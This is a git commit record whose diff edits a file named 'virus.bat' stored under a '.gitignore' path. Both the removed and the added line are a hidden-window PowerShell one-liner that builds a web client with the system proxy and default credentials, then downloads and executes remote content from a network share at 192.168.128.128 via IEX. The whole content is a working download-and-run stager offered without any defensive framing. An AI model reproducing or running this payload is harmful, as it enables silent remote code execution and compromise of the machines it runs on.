03d3f3565c2cf1755a44c5aaafdc354406e04f58
DoDaam <44077899+DoDaam@users.noreply.github.com>
2018-11-01 12:09:09 +0900

    Add files via upload

--- .gitignore/virus.bat
+++ .gitignore/virus.bat
@@ -1,1 +1,1 @@
-powershell.exe -nop -w hidden -c $s=new-object net.webclient;$s.proxy=[Net.WebRequest]::GetSystemWebProxy();$s.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $s.downloadstring('\\192.168.128.128\DtMqv\test.dll');
+powershell.exe -nop -w hidden -c $l=new-object net.webclient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $l.downloadstring('\\192.168.128.128\RsmIl\test.dll');
